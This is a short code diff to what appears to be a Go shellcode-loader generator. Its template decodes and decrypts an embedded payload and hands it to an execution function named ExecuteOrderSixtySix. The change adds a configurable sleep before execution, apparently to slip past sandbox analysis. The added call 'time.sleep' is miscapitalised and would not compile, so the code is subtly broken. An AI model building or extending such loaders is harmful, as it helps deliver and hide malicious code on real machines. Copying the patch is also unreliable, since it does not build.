@@ -127,7 +127,12 @@ go 1.20
 	return nil
 }
 
-func GetMainTemplate(encoding string, key string, sc string) string {
+func GetMainTemplate(
+    encoding string,
+    key string,
+    sc string,
+    sleepTime uint,
+) string {
 
 	/* if hex encoding is used, it does not require to go through StdEncoding */
 	encCall := "enc.StdEncoding"
@@ -139,6 +144,7 @@ func GetMainTemplate(encoding string, key string, sc string) string {
 package main
 
 import (
+    "time"
     "os"
     enc "encoding/%s"
 )
@@ -156,7 +162,8 @@ func main() {
         os.Exit(1)
     }
 
+    time.sleep(%d * time.Second)
     ExecuteOrderSixtySix(decrypted)
 }
-    `, encoding, key, sc, encCall, encCall)
+    `, encoding, key, sc, encCall, encCall, sleepTime)
 }
